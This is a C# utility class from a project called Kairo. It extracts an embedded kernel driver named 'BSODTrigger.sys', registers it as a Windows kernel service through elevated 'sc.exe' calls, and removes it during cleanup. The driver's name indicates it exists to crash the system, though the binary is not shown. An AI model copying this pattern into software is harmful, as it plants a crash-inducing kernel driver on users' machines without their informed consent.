using Kairo.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Kairo.Utils
{
    internal class DriverInstaller
    {
        private const string DriverResourceName = "BSODTrigger.sys"; // Adjust the namespace and filename
        private const string DriverFileName = "BSODTrigger.sys";
        private static readonly string driverPath = Path.Combine(Global.PATH, DriverFileName);
        public static void Installer()
        {
            try
            {
                Cleanup(driverPath);
                // Extract the driver file
                ExtractDriver(driverPath);
                // Install and start the driver
                InstallDriver(driverPath);
            }
            catch (Exception ex)
            {
                Logger.Output(LogType.Error, "Driver installation failed:", ex);
            }
        }

        private static void ExtractDriver(string driverPath)
        {
            try
            {
                if (!File.Exists(driverPath))
                {
                    using (FileStream fileStream = new(driverPath, FileMode.Create))
                    {
                        fileStream.Write(Resources.BSODTrigger, 0, Resources.BSODTrigger.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Output(LogType.Error, "Failed to extract driver:", ex);
                throw;
            }
        }

        private static void InstallDriver(string driverPath)
        {
            try
            {
                Process? create = Process.Start(new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"create BSODDriver binPath= \"{driverPath}\" type= kernel",
                    Verb = "runas",
                    UseShellExecute = false,
                    RedirectStandardOutput = true
                });
                create?.WaitForExit();
                if (create?.ExitCode != 0)
                {
                    Logger.Output(LogType.Error, $"Driver installation process failed with exit code {create.ExitCode}");
                }
            }
            catch (Exception ex)
            {
                Logger.Output(LogType.Error, "Failed to install driver:", ex);
                throw;
            }
        }
        public static void Cleanup() {
            Cleanup(driverPath);
        }
        private static void Cleanup(string driverPath)
        {
            try
            {
                if (File.Exists(driverPath))
                {
                    File.Delete(driverPath);
                }
            }
            catch (Exception ex) { 
            
            }
            

            Process.Start(new ProcessStartInfo
            {
                FileName = "sc.exe",
                Arguments = "delete BSODDriver",
                Verb = "runas", // Ensure it runs with elevated privileges
                UseShellExecute = true
            })?.WaitForExit();
        }
        private static void SortOutputHandler(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                Console.WriteLine(e.Data);
            }
        }
    }
}
